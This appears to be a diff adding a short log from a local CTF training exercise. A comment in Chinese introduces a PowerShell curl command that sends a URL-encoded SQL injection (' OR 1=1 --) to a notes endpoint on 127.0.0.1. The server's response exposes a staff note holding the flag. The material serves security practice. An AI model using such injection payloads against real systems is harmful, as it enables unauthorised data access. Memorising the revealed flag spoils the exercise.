@@ -1,0 +1,10 @@
+# URL 编码形式发送同一注入串（%27 单引号、%20 空格）
+PS C:\Users\mzj\Desktop\CTF\CTF-training-problem-first-full> curl.exe -s -i http://127.0.0.1:8765/notes?title=%27%20OR%201%3D1%20--%20
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.6 Python/3.12.10
+Date: Sat, 26 Sep 2026 03:16:05 GMT
+Content-Type: text/plain; charset=utf-8
+Content-Length: 82
+
+public: Try searching for a note by its title.
+staff: flag{sql_parameters_matter}
